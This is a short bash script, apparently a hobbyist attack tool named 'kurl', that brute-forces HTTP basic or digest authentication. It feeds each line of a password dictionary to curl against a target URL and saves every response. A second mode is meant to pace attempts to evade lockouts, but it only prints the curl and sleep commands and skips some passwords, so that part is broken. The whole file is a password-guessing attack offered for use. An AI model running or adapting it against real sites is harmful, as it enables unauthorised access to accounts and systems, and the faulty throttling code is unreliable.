#!/bin/bash

#
# APP: kurl -- kill http-auth via curl
#
# Auther: 閦蠱(virusmore)
#
# Param:
# $1 -- http-auth type, basic, digest or anyauth. However, anyauth is NOT suggested by curl official.
# $2 -- url to attack
# $3 -- username
# $4 -- path of the dictionary full of passwd
# $5 -- num of max tries in integers
# $6 -- time interval to sleep in seconds
#
# Change Log:
#

# Default time interval of 180 seconds
KURL_DEFAULT_TIME_INTERVAL=180

#
# Pure attack without considering max tries or time interval
#
function kurl_attack () {
	index=0
	cat $4 | while read line
	do
		# Delete all chars that may lead to mistakes
		passwd=`echo $line | tr -d "\n"`
		echo [+]curl --$1 -u $3:$passwd -o "kurl_"$3"_"$index".html" "$2"
		curl --$1 -u $3:$passwd -o "kurl_"$3"_"$index".html" "$2"
		let index++
	done
}

#
# Attack with max tries of interval, 5*60 seconds
#
function kurl_attack_with_max_tries () {
	try=1
	index=0
	time_interval=$KURL_DEFAULT_TIME_INTERVAL

	# Get the time interval user input
	if test $# -eq 6
	then
		time_interval=$6
	fi

	# Loop to attack from the input passwd dictionary
	cat $4 | while read line
	do
		# Delete all chars that may lead to mistakes
		passwd=`echo $line | tr -d "\n"`

		# DO NOT exced the max tries
		if test $try -lt $5
		then
			echo [+] curl --$1 -u $3:$passwd -o "kurl_"$3"_"$passwd"_"$index".html" "$2"
			let try++
		else
			echo [!]Sleep $time_interval
			#echo sleep $time_interval
			let try=1
		fi

		let index++
	done
}

# Check the http-auth type
if [[ $1 != "basic" && $1 != "digest" ]]
then
	echo "[!]Plz check your input on http-auth type!"
	exit 0
fi

# Check the number of params
case $# in
	4)
	# Invoke krul_attack to launch attack
	kurl_attack $1 $2 $3 $4
	;;
	5)
	kurl_attack_with_max_tries $1 $2 $3 $4 $5
	;;
	6)
	kurl_attack_with_max_tries $1 $2 $3 $4 $5 $6
	;;
	*)
	echo "[!]Plz check your input!"
	exit 0
	;;
esac



















